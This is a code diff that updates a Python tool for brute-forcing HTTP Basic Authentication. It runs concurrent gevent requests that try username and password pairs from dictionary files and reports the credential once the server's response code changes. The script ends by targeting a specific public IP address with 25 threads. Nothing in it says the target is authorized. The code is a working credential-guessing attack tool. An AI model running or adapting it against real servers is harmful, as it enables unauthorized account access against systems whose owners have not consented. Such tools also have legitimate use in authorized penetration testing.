@@ -5,11 +5,14 @@ import traceback
 
 import gevent
 from gevent.pool import Pool
+from gevent.lock import BoundedSemaphore
 from gevent import monkey
 monkey.patch_all()
 # 常规库
 import base64
 import logging
+from colorama import Fore, Style
+
 import requests
 from requests.auth import HTTPBasicAuth
 import urllib3
@@ -26,6 +29,12 @@ class reqMethod(Enum):
 DEFAULT_HEADERS = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
         }
+logging.basicConfig(level=logging.INFO,
+                    format='%(asctime)s %(filename)s %(levelname)s %(message)s',
+                    datefmt='%a %d %b %Y %H:%M:%S'
+                    )
+info_white = lambda x:f"{Fore.WHITE}{x}{Style.RESET_ALL}"
+info_green = lambda x:f"{Fore.GREEN}{x}{Style.RESET_ALL}"
 
 def loadDic():
     '''
@@ -35,7 +44,7 @@ def loadDic():
     # TODO 加载账号密码并返回, 配置文件settings.py中有字典的路径
     userList = []
     pwdList = []
-    from settings import usernameDicPath,passwordDicPath
+    from core.settings import usernameDicPath,passwordDicPath
     with open(usernameDicPath, "r") as Fs:
         for user in Fs.readlines():
             user = user.strip()
@@ -56,7 +65,7 @@ class Brute:
     def __init__(self, url, thread):
         self.url = url
         self.threadNum = thread
-        self.isSucceed = 0
+        self.isSucceed = BoundedSemaphore(1)
 
         self.userList = set()
         self.pwdList = set()
@@ -84,10 +93,10 @@ class Brute:
             code = resp.status_code
             if False == code:
                 logging.error(f"Error in status_code({code})")
-            elif 401 != self.getBaseCode():
-                logging.warning(f"[!]Target may not using Basic Auth, status_code:[{code}]")
+            elif 401 != code:
+                logging.warning(f"[!]Target may not using Basic Auth, status_code:[{info_white(code)}]")
             else:
-                logging.info(f"[+]Target is using Basic Auth, [{code}]")
+                logging.info(f"[+]Target is using Basic Auth, [{info_white(code)}]")
 
             if  (resp.status_code is not None):
                 return resp.status_code
@@ -105,7 +114,8 @@ class Brute:
         '''将Basic认证头添加到HTTP请求头中, 并返回一个reponse对象
         :return: requests Response
         '''
-        if (not self.isSucceed):
+        if self.isSucceed.counter:
+            # 确保没有被锁住
             try:
                 if self.reqMethod == reqMethod.GET:
                     resp = requests.get(self.url, auth=auth, timeout=self.timeout, verify=self.SSL_veirfy)
@@ -117,16 +127,14 @@ class Brute:
                 logging.info("[-]Now trying to login with: %s" % self.nowPair)
                 # 中断标记。若爆破成功，停止爆破
                 if self.base_status_code != resp.status_code:
-                    self.isSucceed = 1
+                    self.isSucceed.acquire()
                     # TODO 将usr/pwd的组装放入req中进行，以免无法还原usr/pwd串
                     self.realPwd = f"{auth.username}/{auth.password}"
-                    logging.error(f"[{resp.status_code}]self.realPwd, (compared with original [{self.base_status_code}])")
+                    logging.info(f"[+]Now we got [{info_green(resp.status_code)}], Good good, the original status_code is [{info_white(self.base_status_code)}])")
             except Exception as e:
-                #TODO log it
-                logging.info("[-]request error, reason: %s" % e)
+                logging.warning("[-]request error, reason: %s" % e)
         else:
-            # 爆破成功，打印结果
-            logging.info("[+]Good, Result is: %s" % self.realPwd)
+            pass
 
 
     def run(self):
@@ -137,7 +145,8 @@ class Brute:
 
         # 加载字典, 并完成生成器的初始化
         pool = Pool(size=self.threadNum)
-        logging.info(f"[+]Current {self.threadNum}x")
+        logging.info(f"[+]Current thread is {self.threadNum}")
+        logging.info(f"{info_white('-'*50)}")
         jobs = []
         # 生成器
         if not (self.userList and self.pwdList):
@@ -149,16 +158,19 @@ class Brute:
                 auth = HTTPBasicAuth(usr, pwd)
                 job = pool.spawn(self.req, auth)
                 jobs.append(job)
-        pool.joinall(jobs)
+        gevent.joinall(jobs)
         # jobs = [pool.spawn(self.req, auth) for auth in self.yieldAuth()]
         # gevent.joinall(jobs)
-        logging.info("Done, if there is no results, then Brute Force regarded failed")
+        # 爆破成功，打印结果
+        logging.info(f"{info_white('-'*50)}")
+        if self.realPwd != None:
+            logging.info(f"[+]Great! cred for {Fore.GREEN}{self.url}{Style.RESET_ALL} is: {Fore.GREEN}%s{Style.RESET_ALL}" % self.realPwd)
+        else:
+            logging.info("Done, if there is no results, then Brute Force regarded failed")
+
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO,
-                    format='%(asctime)s %(filename)s %(levelname)s %(message)s',
-                    datefmt='%a %d %b %Y %H:%M:%S'
-                    )
+
     brute = Brute(url="http://123.0.238.51/", thread=25)
     brute.run()
 
